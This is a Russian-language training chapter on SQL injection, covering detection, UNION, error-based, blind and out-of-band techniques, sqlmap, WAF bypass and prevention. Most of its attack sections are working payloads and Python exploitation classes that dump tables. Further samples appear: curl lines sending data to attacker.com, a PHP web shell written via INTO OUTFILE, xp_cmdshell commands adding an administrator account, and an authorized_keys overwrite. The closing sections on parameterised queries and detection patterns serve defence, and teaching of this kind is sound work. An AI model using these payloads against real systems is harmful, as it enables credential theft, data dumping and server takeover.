# Глава 11.1: SQL Injection: все виды и эксплуатация

## Введение

SQL Injection (SQLi) — это атака на веб-приложение, при которой злоумышленник внедряет произвольный SQL-код в запрос к базе данных. По данным OWASP, SQLi остаётся в топ-10 наиболее опасных уязвимостей на протяжении более 20 лет. Успешная атака может привести к:

- Обходу аутентификации
- Утечке всей базы данных (пользователи, пароли, платёжные данные)
- Изменению или удалению данных
- Выполнению команд ОС (при определённых конфигурациях)
- Чтению произвольных файлов с сервера

```
┌─────────────────────────────────────────────────────────────┐
│                   SQL INJECTION TAXONOMY                     │
│                                                              │
│                    SQL Injection                             │
│                         │                                    │
│         ┌───────────────┼───────────────┐                   │
│         │               │               │                    │
│    In-band SQLi    Inferential SQLi   Out-of-band SQLi      │
│         │               │               │                    │
│    ┌────┤          ┌────┤          ┌────┘                   │
│    │    │          │    │          │                         │
│ Union Error-  Boolean Time-   DNS  HTTP                     │
│ -based based   -based based  (OOB) (OOB)                    │
└─────────────────────────────────────────────────────────────┘
```

> **Важно:** Все примеры в этой главе предназначены исключительно для образовательных целей и тестирования систем, к которым у вас есть письменное разрешение. Несанкционированная эксплуатация SQLi является уголовным преступлением.

---

## 11.1.1 Классический SQL Injection (In-band)

### Обнаружение уязвимости

```sql
-- Базовые проверки на уязвимость:

-- 1. Одинарная кавычка (синтаксическая ошибка)
http://target.com/item?id=1'

-- 2. Числовые проверки (тавтология)
http://target.com/item?id=1 AND 1=1    -- Возвращает результат
http://target.com/item?id=1 AND 1=2    -- Пустой результат = уязвимо

-- 3. Комментарии
http://target.com/item?id=1--
http://target.com/item?id=1#
http://target.com/item?id=1/*comment*/

-- 4. Строковые инъекции
http://target.com/search?q=test' AND '1'='1
http://target.com/search?q=test' AND '1'='2
```

### Обход аутентификации

```sql
-- Уязвимый PHP-код:
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

-- Классический обход (OR 1=1):
-- username: admin'--
-- Результирующий запрос:
SELECT * FROM users WHERE username='admin'--' AND password='...'
-- Всё после -- является комментарием → условие password игнорируется

-- Другие варианты:
username: ' OR '1'='1
password: ' OR '1'='1
-- Запрос: SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'

-- Обход с любым пользователем:
username: anything' OR 1=1--
password: anything

-- Для MySQL:
username: admin'/*
password: */ --

-- Для MSSQL:
username: admin';--
password: anything

-- Вход как первый пользователь в таблице:
username: ' OR 1=1 LIMIT 1--
```

### Определение количества столбцов (ORDER BY)

```sql
-- Подбор количества столбцов через ORDER BY:
http://target.com/item?id=1 ORDER BY 1--   -- OK
http://target.com/item?id=1 ORDER BY 2--   -- OK
http://target.com/item?id=1 ORDER BY 3--   -- OK
http://target.com/item?id=1 ORDER BY 4--   -- Error! → 3 столбца

-- Через NULL:
http://target.com/item?id=1 UNION SELECT NULL--           -- Error
http://target.com/item?id=1 UNION SELECT NULL,NULL--      -- Error
http://target.com/item?id=1 UNION SELECT NULL,NULL,NULL-- -- OK → 3 столбца
```

---

## 11.1.2 UNION-based SQL Injection

UNION-based инъекция позволяет получить данные из других таблиц, добавив собственный SELECT через оператор UNION.

```sql
-- Условие UNION: количество столбцов и типы данных должны совпадать

-- Определение типов данных:
-- Подставляем NULL, затем заменяем на типизированные значения:
http://target.com/item?id=1 UNION SELECT NULL,NULL,NULL--
http://target.com/item?id=1 UNION SELECT 'a',NULL,NULL--   -- Если строка
http://target.com/item?id=1 UNION SELECT NULL,1,NULL--     -- Если число
http://target.com/item?id=1 UNION SELECT NULL,NULL,'a'--   -- Если строка

-- Получение версии БД (MySQL):
http://target.com/item?id=999 UNION SELECT NULL,version(),NULL--

-- Получение текущей БД:
http://target.com/item?id=999 UNION SELECT NULL,database(),NULL--

-- Список баз данных (MySQL):
http://target.com/item?id=999 UNION SELECT NULL,schema_name,NULL 
FROM information_schema.schemata--

-- Список таблиц текущей БД:
http://target.com/item?id=999 UNION SELECT NULL,table_name,NULL 
FROM information_schema.tables 
WHERE table_schema=database()--

-- Список столбцов таблицы users:
http://target.com/item?id=999 UNION SELECT NULL,column_name,NULL 
FROM information_schema.columns 
WHERE table_name='users'--

-- Извлечение данных:
http://target.com/item?id=999 UNION SELECT NULL,concat(username,':',password),NULL 
FROM users--

-- Множественные строки через GROUP_CONCAT:
http://target.com/item?id=999 UNION SELECT NULL,
GROUP_CONCAT(username,':',password SEPARATOR '\n'),NULL 
FROM users--

-- PostgreSQL версия:
http://target.com/item?id=999 UNION SELECT NULL,version(),NULL--
-- Список таблиц PostgreSQL:
http://target.com/item?id=999 UNION SELECT NULL,tablename,NULL 
FROM pg_tables 
WHERE schemaname='public'--

-- MSSQL версия:
http://target.com/item?id=999 UNION SELECT NULL,@@version,NULL--
-- Список таблиц MSSQL:
http://target.com/item?id=999 UNION SELECT NULL,table_name,NULL 
FROM information_schema.tables--
```

---

## 11.1.3 Error-based SQL Injection

Ошибки базы данных могут раскрывать информацию в сообщениях об ошибках.

```sql
-- MySQL: extractvalue() для извлечения данных через ошибку:
http://target.com/item?id=1 AND extractvalue(1,concat(0x7e,version()))

-- Вывод ошибки: XPATH syntax error: '~5.7.35-log'
-- 0x7e = символ ~, используется как разделитель

-- MySQL: updatexml():
http://target.com/item?id=1 AND updatexml(1,concat(0x7e,database()),1)

-- Получение данных через ошибку (MySQL):
http://target.com/item?id=1 AND extractvalue(1,
    concat(0x7e,(SELECT concat(username,':',password) FROM users LIMIT 0,1)))

-- MSSQL: convert() для извлечения:
http://target.com/item?id=1 CONVERT(int,(SELECT TOP 1 username FROM users))
-- Error: Conversion failed when converting the nvarchar value 'admin' to data type int.

-- MSSQL: через @@version:
http://target.com/item?id=1'; SELECT CONVERT(INT, @@version)--
-- Error: Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019...' to int

-- PostgreSQL: через CAST:
http://target.com/item?id=1 AND 1=CAST((SELECT version()) AS INT)
-- Error: invalid input syntax for type integer: "PostgreSQL 13.4..."

-- Oracle: через UTL_INADDR или XMLType:
http://target.com/item?id=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))
```

---

## 11.1.4 Blind Boolean-based SQL Injection

Когда нет прямого вывода ошибок, используется слепая инъекция по булевым значениям.

```sql
-- Принцип: отправляем два разных запроса, наблюдаем разницу в ответе

-- Истинное условие (страница нормальная):
http://target.com/item?id=1 AND 1=1
-- Ложное условие (страница пустая или другая):
http://target.com/item?id=1 AND 1=2

-- Определение длины имени БД:
http://target.com/item?id=1 AND LENGTH(database())=4    -- 4 символа?
http://target.com/item?id=1 AND LENGTH(database())=5    -- 5 символов? ...

-- Побуквенное извлечение имени БД:
http://target.com/item?id=1 AND SUBSTRING(database(),1,1)='a'
http://target.com/item?id=1 AND SUBSTRING(database(),1,1)='b'
...
-- Или через ASCII для обхода фильтров кавычек:
http://target.com/item?id=1 AND ASCII(SUBSTRING(database(),1,1))=115  -- s=115
http://target.com/item?id=1 AND ASCII(SUBSTRING(database(),2,1))=104  -- h=104
-- Итого: "sh..." → имя БД начинается с "sh"

-- Бинарный поиск (ускорение перебора):
http://target.com/item?id=1 AND ASCII(SUBSTRING(database(),1,1))>77   -- >M?
http://target.com/item?id=1 AND ASCII(SUBSTRING(database(),1,1))>102  -- >f?
http://target.com/item?id=1 AND ASCII(SUBSTRING(database(),1,1))>115  -- >s?
-- Сужаем диапазон пополам до нахождения символа

-- Проверка наличия таблицы 'users':
http://target.com/item?id=1 AND (SELECT COUNT(*) FROM information_schema.tables 
WHERE table_schema=database() AND table_name='users')=1

-- Извлечение первого имени пользователя (побуквенно):
http://target.com/item?id=1 AND SUBSTRING(
    (SELECT username FROM users LIMIT 0,1),1,1)='a'
```

### Автоматизация Boolean-based SQLi на Python

```python
#!/usr/bin/env python3
"""
Автоматизированная эксплуатация Boolean-based Blind SQL Injection
"""

import requests
import string
import time
from typing import Callable, Optional

class BooleanBlindSQLi:
    """Эксплуататор Boolean-based Blind SQLi"""
    
    CHARSET = string.ascii_letters + string.digits + string.punctuation + ' '
    
    def __init__(
        self, 
        url: str, 
        param: str,
        true_condition: str,
        check_true: Callable[[str], bool],
        delay: float = 0.1
    ):
        self.url = url
        self.param = param
        self.true_condition = true_condition
        self.check_true = check_true
        self.delay = delay
        self.session = requests.Session()
    
    def is_true(self, condition: str) -> bool:
        """Проверяет, является ли SQL-условие истинным"""
        payload = f"1 AND ({condition})"
        params = {self.param: payload}
        
        try:
            response = self.session.get(self.url, params=params, timeout=10)
            time.sleep(self.delay)
            return self.check_true(response.text)
        except requests.RequestException:
            return False
    
    def get_length(self, sql_expr: str, max_length: int = 100) -> int:
        """Определяет длину результата SQL-выражения"""
        for length in range(1, max_length + 1):
            if self.is_true(f"LENGTH({sql_expr})={length}"):
                return length
        return 0
    
    def get_char_binary_search(self, sql_expr: str, position: int) -> Optional[str]:
        """Бинарный поиск символа на заданной позиции"""
        low, high = 32, 126  # printable ASCII
        
        while low <= high:
            mid = (low + high) // 2
            
            if self.is_true(f"ASCII(SUBSTRING({sql_expr},{position},1))>{mid}"):
                low = mid + 1
            elif self.is_true(f"ASCII(SUBSTRING({sql_expr},{position},1))<{mid}"):
                high = mid - 1
            else:
                # ASCII(char) == mid
                return chr(mid)
        
        return None
    
    def extract_string(self, sql_expr: str, max_length: int = 100) -> str:
        """Извлекает строку через побуквенный binary search"""
        length = self.get_length(sql_expr, max_length)
        print(f"[*] Длина строки: {length}")
        
        result = []
        for i in range(1, length + 1):
            char = self.get_char_binary_search(sql_expr, i)
            if char:
                result.append(char)
                print(f"[*] Прогресс: {''.join(result)}", end='\r')
        
        print()
        return ''.join(result)
    
    def enumerate_databases(self) -> list:
        """Перечисление баз данных"""
        databases = []
        
        # Получаем количество БД
        for count in range(1, 20):
            if self.is_true(
                f"(SELECT COUNT(schema_name) FROM information_schema.schemata)={count}"
            ):
                db_count = count
                break
        else:
            return databases
        
        print(f"[*] Найдено баз данных: {db_count}")
        
        # Извлекаем имя каждой БД
        for i in range(db_count):
            db_name = self.extract_string(
                f"(SELECT schema_name FROM information_schema.schemata LIMIT {i},1)"
            )
            databases.append(db_name)
            print(f"[+] База данных [{i}]: {db_name}")
        
        return databases
    
    def dump_table(self, table: str, columns: list, limit: int = 100) -> list:
        """Дамп данных из таблицы"""
        concat_expr = f"CONCAT_WS(':',{','.join(columns)})"
        results = []
        
        # Получаем количество строк
        for count in range(1, limit + 1):
            if self.is_true(f"(SELECT COUNT(*) FROM {table})={count}"):
                row_count = count
                break
        else:
            row_count = 0
        
        print(f"[*] Строк в {table}: {row_count}")
        
        for i in range(row_count):
            row_data = self.extract_string(
                f"(SELECT {concat_expr} FROM {table} LIMIT {i},1)"
            )
            results.append(row_data)
            print(f"[+] Строка [{i}]: {row_data}")
        
        return results


# Пример использования на тестовой системе:
def example_usage():
    """Пример использования (только для тестовых систем!)"""
    
    TARGET_URL = "http://testphp.vulnweb.com/listproducts.php"
    
    def response_is_true(response_text: str) -> bool:
        """Определяем 'true' по наличию данных в ответе"""
        return "product" in response_text.lower() and len(response_text) > 500
    
    sqli = BooleanBlindSQLi(
        url=TARGET_URL,
        param="cat",
        true_condition="1=1",
        check_true=response_is_true,
        delay=0.1
    )
    
    # Извлечение имени текущей БД
    print("[*] Извлечение имени базы данных...")
    db_name = sqli.extract_string("database()")
    print(f"[+] База данных: {db_name}")
    
    # Перечисление БД
    databases = sqli.enumerate_databases()
    
    # Дамп таблицы users
    users = sqli.dump_table("users", ["uname", "pass"])
    
    return db_name, databases, users


if __name__ == '__main__':
    example_usage()
```

---

## 11.1.5 Blind Time-based SQL Injection

Когда нет никакого видимого различия в ответе, используется задержка запроса.

```sql
-- MySQL: SLEEP()
http://target.com/item?id=1 AND SLEEP(5)--    -- 5 секундная задержка = уязвимо

-- Условная задержка:
http://target.com/item?id=1 AND IF(1=1,SLEEP(5),0)--    -- задержка (TRUE)
http://target.com/item?id=1 AND IF(1=2,SLEEP(5),0)--    -- без задержки (FALSE)

-- Извлечение данных через timing:
-- Первый символ DB_name == 's'? (задержка = да)
http://target.com/item?id=1 AND IF(SUBSTRING(database(),1,1)='s',SLEEP(3),0)--

-- PostgreSQL: pg_sleep()
http://target.com/item?id=1; SELECT pg_sleep(5)--
-- Или:
http://target.com/item?id=1 AND 1=(SELECT 1 FROM pg_sleep(5))--

-- MSSQL: WAITFOR DELAY
http://target.com/item?id=1; WAITFOR DELAY '0:0:5'--

-- Oracle: dbms_pipe.receive_message
http://target.com/item?id=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

-- Стэкованные запросы + time-based (MSSQL):
http://target.com/item?id=1; IF (1=1) WAITFOR DELAY '0:0:5'--
```

```python
#!/usr/bin/env python3
"""
Time-based Blind SQL Injection эксплуататор
"""

import requests
import time

class TimeBasedSQLi:
    """Эксплуататор Time-based Blind SQLi"""
    
    def __init__(self, url: str, param: str, delay: float = 3.0, threshold: float = 2.0):
        self.url = url
        self.param = param
        self.delay = delay
        self.threshold = threshold  # Минимальная задержка для "True"
        self.session = requests.Session()
    
    def inject(self, condition: str) -> bool:
        """Проверяет условие через временную задержку"""
        # MySQL payload
        payload = f"1 AND IF(({condition}),SLEEP({self.delay}),0)-- -"
        params = {self.param: payload}
        
        start = time.time()
        try:
            self.session.get(self.url, params=params, timeout=self.delay + 5)
        except requests.Timeout:
            return True  # Timeout = задержка была
        elapsed = time.time() - start
        
        return elapsed >= self.threshold
    
    def extract_string(self, sql_expr: str, max_len: int = 50) -> str:
        """Извлечение строки через timing"""
        result = []
        
        # Определяем длину
        length = 0
        for i in range(1, max_len + 1):
            if self.inject(f"LENGTH({sql_expr})={i}"):
                length = i
                break
        
        print(f"[*] Длина: {length}")
        
        # Бинарный поиск каждого символа
        for pos in range(1, length + 1):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                if self.inject(f"ASCII(SUBSTRING({sql_expr},{pos},1))>{mid}"):
                    low = mid + 1
                elif self.inject(f"ASCII(SUBSTRING({sql_expr},{pos},1))<{mid}"):
                    high = mid - 1
                else:
                    result.append(chr(mid))
                    print(f"[*] Символ {pos}: {chr(mid)}")
                    break
        
        return ''.join(result)
```

---

## 11.1.6 Out-of-band SQL Injection

OOB-инъекция использует внешние каналы (DNS, HTTP) для передачи данных.

```sql
-- MySQL: LOAD_FILE + UNC-путь (Windows)
-- Требует: FILE привилегию, secure_file_priv="" 
http://target.com/item?id=1 UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),
    '.attacker.com\\a'))-- 

-- MySQL: OUT FILE (запись файла):
http://target.com/item?id=1 UNION SELECT 'test' INTO OUTFILE '/var/www/html/test.txt'--

-- MSSQL: xp_dirtree (DNS lookup)
-- Требует: sysadmin роль
'; DECLARE @q VARCHAR(1024); SET @q='\\'+@@version+'.attacker.com\a';
EXEC master.dbo.xp_dirtree @q;--

-- MSSQL: openrowset для HTTP
'; EXEC master..xp_cmdshell 'curl http://attacker.com/?data='+@@version--

-- Oracle: UTL_HTTP для HTTP запроса
http://target.com/item?id=1 UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||
    (SELECT user FROM dual)) FROM dual--

-- PostgreSQL: COPY TO/FROM для файлов
-- Требует: superuser
'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?v='+version()--

-- Burp Collaborator для OOB:
-- Используйте BURP_COLLABORATOR_URL.burpcollaborator.net
-- MySQL: 
LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.BURP_COLLAB_URL\\file'))
-- MSSQL:
'; EXEC master..xp_dirtree '\\'+database()+'.BURP_COLLAB_URL\a'--
```

---

## 11.1.7 Second-Order SQL Injection

```php
<?php
// Пример уязвимого кода Second-Order SQLi

// ШАГ 1: Регистрация пользователя (данные правильно экранируются)
$username = $_POST['username'];
$username_safe = $pdo->quote($username);

// Безопасная вставка через quote()
$pdo->query("INSERT INTO users (username) VALUES ($username_safe)");
// Если ввести: admin'-- → в БД сохранится: admin'--

// ШАГ 2: Смена пароля (берёт username из БД без экранирования)
// Здесь уязвимость!
$user = $_SESSION['username']; // Значение из БД: admin'--
$new_pass = password_hash($_POST['new_password'], PASSWORD_DEFAULT);

// УЯЗВИМЫЙ запрос (username получен из БД, но не экранируется повторно)
$query = "UPDATE users SET password='$new_pass' WHERE username='$user'";
// Итоговый запрос:
// UPDATE users SET password='hash' WHERE username='admin'--'
// → Меняет пароль пользователя 'admin', игнорируя закрывающую кавычку!
$pdo->query($query);
?>
```

```python
# Демонстрация Second-Order SQLi
import requests

SESSION = requests.Session()
TARGET = "http://vulnerable-app.local"

# Шаг 1: Регистрация с вредоносным именем пользователя
# Имя: admin'--
print("[*] Регистрация пользователя с payload в имени...")
register_data = {
    'username': "admin'--",
    'password': 'attacker_pass',
    'email': 'attacker@evil.com'
}
resp = SESSION.post(f"{TARGET}/register", data=register_data)
print(f"    Status: {resp.status_code}")

# Шаг 2: Вход под зарегистрированным пользователем
print("[*] Вход под именем 'admin'--' ...")
login_data = {
    'username': "admin'--",
    'password': 'attacker_pass'
}
resp = SESSION.post(f"{TARGET}/login", data=login_data)
print(f"    Status: {resp.status_code}")

# Шаг 3: Смена пароля (триггер Second-Order SQLi)
print("[*] Смена пароля (триггер инъекции)...")
change_pass_data = {
    'new_password': 'hacked123',
    'confirm_password': 'hacked123'
}
resp = SESSION.post(f"{TARGET}/change_password", data=change_pass_data)
print(f"    Status: {resp.status_code}")

# Шаг 4: Попытка входа как admin с новым паролем
print("[*] Попытка входа как admin с новым паролем...")
admin_login = {
    'username': 'admin',
    'password': 'hacked123'
}
resp = SESSION.post(f"{TARGET}/login", data=admin_login)
print(f"    {'[+] УСПЕХ!' if 'Welcome, admin' in resp.text else '[-] Неудача'}")
```

---

## 11.1.8 SQLMap: автоматизация эксплуатации

```bash
# Базовое использование
sqlmap -u "http://target.com/item?id=1" --batch

# Тестирование конкретного параметра
sqlmap -u "http://target.com/search?q=test&cat=1" -p cat

# POST-запрос
sqlmap -u "http://target.com/login" \
    --data="username=admin&password=test" \
    -p username

# С сохранёнными куками
sqlmap -u "http://target.com/profile?id=1" \
    --cookie="session=abc123; auth=user1"

# Из сохранённого Burp-запроса
sqlmap -r burp_request.txt

# Определение СУБД вручную (ускоряет)
sqlmap -u "http://target.com/item?id=1" --dbms=mysql

# Уровень и риск (1-5, по умолчанию 1)
# risk=3 включает OR-based инъекции (опасно для данных)
sqlmap -u "http://target.com/item?id=1" --level=3 --risk=2

# Перечисление БД
sqlmap -u "http://target.com/item?id=1" --dbs

# Перечисление таблиц
sqlmap -u "http://target.com/item?id=1" -D myapp --tables

# Перечисление столбцов
sqlmap -u "http://target.com/item?id=1" -D myapp -T users --columns

# Дамп таблицы
sqlmap -u "http://target.com/item?id=1" -D myapp -T users --dump

# Дамп с фильтром
sqlmap -u "http://target.com/item?id=1" -D myapp -T users \
    --dump --where="admin=1"

# Дамп всей БД
sqlmap -u "http://target.com/item?id=1" -D myapp --dump-all

# Получение OS Shell (если есть привилегии FILE + stacked queries)
sqlmap -u "http://target.com/item?id=1" --os-shell

# SQL Shell
sqlmap -u "http://target.com/item?id=1" --sql-shell

# Обход WAF через tamper scripts
sqlmap -u "http://target.com/item?id=1" \
    --tamper=space2comment,randomcase,between

# Все доступные tamper scripts:
# apostrophemask, base64encode, between, bluecoat, 
# charencode, charunicodeencode, concat2concatws,
# equaltolike, greatest, ifnull2ifisnull,
# modsecurityversioned, multiplespaces, nonrecursivereplacement,
# percentage, randomcase, securesphere, space2comment,
# space2dash, space2hash, space2mssqlblank, space2mysqldash,
# space2plus, space2randomblank, unionalltounion, unmagicquotes

# Прокси через Burp
sqlmap -u "http://target.com/item?id=1" \
    --proxy="http://127.0.0.1:8080"

# Техника инъекции вручную
sqlmap -u "http://target.com/item?id=1" \
    --technique=BEUSTQ  # B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline

# Чтение файла (требует FILE привилегию)
sqlmap -u "http://target.com/item?id=1" \
    --file-read="/etc/passwd"

# Запись файла
sqlmap -u "http://target.com/item?id=1" \
    --file-write="shell.php" \
    --file-dest="/var/www/html/shell.php"
```

---

## 11.1.9 Обход WAF

### Техники обфускации

```sql
-- 1. Изменение регистра:
sElEcT * fRoM uSeRs

-- 2. Комментарии внутри ключевых слов (MySQL):
SE/*comment*/LECT
UN/**/ION/**/SE/**/LECT

-- 3. URL-encoding:
%53%45%4C%45%43%54  = SELECT
%27 = '
%20 = пробел

-- 4. Двойное URL-encoding:
%2527 = %27 = '

-- 5. Unicode encoding:
SE\u004CECT
SELE%00CT  (null byte injection)

-- 6. Замена пробелов:
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  (%09=TAB)
SELECT%0Ausername%0AFROM%0Ausers  (%0A=newline)
SELECT(username)FROM(users)

-- 7. Научные нотации (MySQL):
1e0 UNION = 1 UNION
1.0 UNION = 1 UNION

-- 8. Escape sequences:
\x53\x45\x4c\x45\x43\x54 = SELECT (MySQL hex)

-- 9. Эквиваленты функций:
-- MID() вместо SUBSTRING()
-- LPAD() вместо SUBSTRING()
-- STRCMP() для сравнения
-- IF() вместо CASE WHEN

-- 10. Bypass через HTTP параметры:
-- HPP (HTTP Parameter Pollution):
?id=1&id=UNION&id=SELECT&id=1,2,3

-- 11. JSON/XML обходы (если WAF не декодирует):
{"id": "1 UNION SELECT 1,2,3--"}

-- 12. Chunked Transfer Encoding (HTTP уровень)
-- Разбивает запрос на чанки, WAF может не собирать их

-- 13. Широкие символы (для WAF с CHAR-фильтрами):
%bf%27  -- В GBK кодировке это валидный символ + '
-- Обходит addslashes() при неправильной кодировке

-- 14. Второй порядок / хранение в БД и выполнение позже
```

### sqlmap tamper scripts для WAF bypass

```bash
# Создание собственного tamper script:
cat > my_tamper.py << 'EOF'
#!/usr/bin/env python3
"""
Кастомный tamper script для обхода конкретного WAF
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Обфускация через замену пробелов и добавление комментариев
    """
    if payload:
        # Заменяем пробелы на /**/:
        payload = payload.replace(' ', '/**/')
        
        # Меняем регистр ключевых слов:
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR']
        for kw in keywords:
            # Чередуем регистр
            new_kw = ''.join(
                c.upper() if i % 2 == 0 else c.lower() 
                for i, c in enumerate(kw)
            )
            payload = payload.replace(kw, new_kw)
    
    return payload
EOF

# Использование:
sqlmap -u "http://target.com/item?id=1" --tamper=my_tamper
```

---

## 11.1.10 Хранимые процедуры и расширенные техники

### MSSQL: xp_cmdshell

```sql
-- Включение xp_cmdshell (требует sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Выполнение команд ОС:
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'net user hacker P@ssw0rd /add'
EXEC xp_cmdshell 'net localgroup administrators hacker /add'

-- Через инъекцию (stacked queries):
'; EXEC xp_cmdshell 'powershell -enc BASE64ENCODED_PAYLOAD'--

-- Без xp_cmdshell через OLE Automation:
DECLARE @shell INT
EXEC sp_oacreate 'wscript.shell', @shell OUTPUT
EXEC sp_oamethod @shell, 'run', NULL, 'cmd /c whoami > C:\output.txt'
```

### MySQL: FILE Privileges

```sql
-- Чтение файлов (требует FILE привилегию)
UNION SELECT LOAD_FILE('/etc/passwd')--
UNION SELECT LOAD_FILE('/etc/shadow')--
UNION SELECT LOAD_FILE('/var/www/html/config.php')--

-- Запись файлов:
UNION SELECT '<?php system($_GET["cmd"]); ?>' 
INTO OUTFILE '/var/www/html/shell.php'--

-- Запись SSH ключа:
UNION SELECT '-----BEGIN RSA PRIVATE KEY-----...' 
INTO OUTFILE '/root/.ssh/authorized_keys'--
```

---

## 11.1.11 Предотвращение SQL Injection

### Параметризованные запросы (PHP)

```php
<?php
// УЯЗВИМЫЙ КОД - НЕ ДЕЛАЙТЕ ТАК:
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);

// ПРАВИЛЬНЫЙ ПОДХОД: Подготовленные запросы (PDO):
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
$result = $stmt->fetchAll();

// ПРАВИЛЬНЫЙ ПОДХОД: Именованные параметры:
$stmt = $pdo->prepare(
    "SELECT * FROM users WHERE username = :username AND password = :password"
);
$stmt->execute([
    ':username' => $username,
    ':password' => $password
]);

// ПРАВИЛЬНЫЙ ПОДХОД: MySQLi prepared statements:
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();

// ДОПОЛНИТЕЛЬНАЯ ЗАЩИТА: Хэширование паролей (не хранить в открытом виде!)
// При регистрации:
$password_hash = password_hash($password, PASSWORD_ARGON2ID);
$stmt = $pdo->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
$stmt->execute([$username, $password_hash]);

// При входе:
$stmt = $pdo->prepare("SELECT password FROM users WHERE username = ?");
$stmt->execute([$username]);
$row = $stmt->fetch();
if ($row && password_verify($password, $row['password'])) {
    // Аутентификация успешна
}

// Динамические имена таблиц/столбцов (параметры не работают):
// Используйте whitelist:
$allowed_tables = ['users', 'products', 'orders'];
$table = $_GET['table'];
if (!in_array($table, $allowed_tables, true)) {
    die('Invalid table name');
}
$stmt = $pdo->prepare("SELECT * FROM `$table` WHERE id = ?");
$stmt->execute([$id]);
?>
```

```python
# Python: защита от SQLi

# SQLAlchemy ORM (рекомендуется):
from sqlalchemy import text, select
from sqlalchemy.orm import Session

# НЕПРАВИЛЬНО:
query = f"SELECT * FROM users WHERE username = '{username}'"
session.execute(text(query))

# ПРАВИЛЬНО: ORM-запросы:
user = session.query(User).filter(
    User.username == username,
    User.password == password_hash
).first()

# ПРАВИЛЬНО: text() с параметрами:
query = text("SELECT * FROM users WHERE username = :username AND password = :password")
result = session.execute(query, {"username": username, "password": password_hash})

# ПРАВИЛЬНО: asyncpg с параметрами:
import asyncpg

conn = await asyncpg.connect(...)
result = await conn.fetch(
    "SELECT * FROM users WHERE username = $1 AND password = $2",
    username, password_hash
)

# MySQL Connector:
import mysql.connector

cursor = conn.cursor(prepared=True)
sql = "SELECT * FROM users WHERE username = %s AND password = %s"
cursor.execute(sql, (username, password_hash))
```

### Дополнительные меры защиты

```python
# 1. Принцип наименьших привилегий для БД-пользователя:
"""
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON myapp.users TO 'app_user'@'localhost';
-- НЕ давать: DROP, ALTER, FILE, SUPER, EXECUTE на xp_cmdshell
"""

# 2. Валидация входных данных:
import re

def validate_username(username: str) -> bool:
    """Допускаем только буквы, цифры, дефис, подчёркивание"""
    return bool(re.match(r'^[a-zA-Z0-9_\-]{3,50}$', username))

def validate_id(id_param: str) -> int:
    """ID должен быть целым положительным числом"""
    try:
        id_val = int(id_param)
        if id_val < 1:
            raise ValueError
        return id_val
    except (ValueError, TypeError):
        raise ValueError("Invalid ID parameter")

# 3. WAF и экранирование (последний рубеж, не основная защита):
def escape_for_mysql(value: str) -> str:
    """ТОЛЬКО как дополнительный слой, основа - параметризация!"""
    # В реальности используйте библиотечные функции
    return value.replace("'", "\\'").replace("\\", "\\\\")

# 4. Ограничение вывода ошибок (не показывать SQL-ошибки пользователю):
try:
    result = db.execute(query, params)
except Exception as e:
    # Логируем детальную ошибку
    logger.error(f"Database error: {e}", exc_info=True)
    # Пользователю - общее сообщение
    return {"error": "Database error occurred"}, 500

# 5. Мониторинг и обнаружение:
SQLI_PATTERNS = [
    r"('\s*OR\s*'|'\s*OR\s+\d)",
    r"(UNION\s+SELECT|UNION\s+ALL\s+SELECT)",
    r"(;\s*DROP\s+TABLE|;\s*DELETE\s+FROM)",
    r"(SELECT\s+.*\s+FROM\s+information_schema)",
    r"(SLEEP\s*\(\d+\)|WAITFOR\s+DELAY)",
]

import re

def detect_sqli(user_input: str) -> bool:
    """Базовое обнаружение SQLi в запросе"""
    for pattern in SQLI_PATTERNS:
        if re.search(pattern, user_input, re.IGNORECASE):
            return True
    return False
```

---

## Итоги главы

В этой главе мы изучили все основные виды SQL Injection и методы их эксплуатации:

1. **In-band SQLi**: UNION-based и Error-based — прямой вывод данных
2. **Blind SQLi**: Boolean-based и Time-based — для сред без прямого вывода
3. **Out-of-band SQLi**: DNS/HTTP каналы — для обхода фаерволов
4. **Second-Order SQLi**: инъекция на этапе хранения, срабатывает позже
5. **sqlmap**: мощный инструмент автоматизации, но требует понимания ручных техник
6. **Обход WAF**: обфускация, encoding, tamper scripts
7. **Защита**: параметризованные запросы — единственно надёжный метод

> **Важно:** Параметризованные запросы/ORM — это не «дополнительная» защита, это обязательное требование. Никакое экранирование или WAF не заменит правильную архитектуру запросов.

---

## Практические задания

### Задание 1: DVWA SQLi практика
Настройте DVWA и пройдите все уровни SQLi (Low, Medium, High, Impossible):
```bash
docker run --rm -p 80:80 vulnerables/web-dvwa
# Логин: admin / password
```

### Задание 2: SQLi в CTF
Решите задачи SQLi на платформах:
- HackTheBox: machines с тегом "SQL Injection"
- TryHackMe: "SQL Injection Lab"
- PentesterLab: "SQL Injection" exercises

### Задание 3: Ручная эксплуатация
На уязвимом приложении (DVWA/bWAPP) выполните UNION-based инъекцию вручную:
1. Определите количество столбцов через ORDER BY
2. Найдите выводимые столбцы
3. Извлеките список таблиц из information_schema
4. Получите дамп таблицы users

### Задание 4: Написание tamper script
Создайте tamper script для sqlmap, который:
- Заменяет пробелы на `%0a%0d`
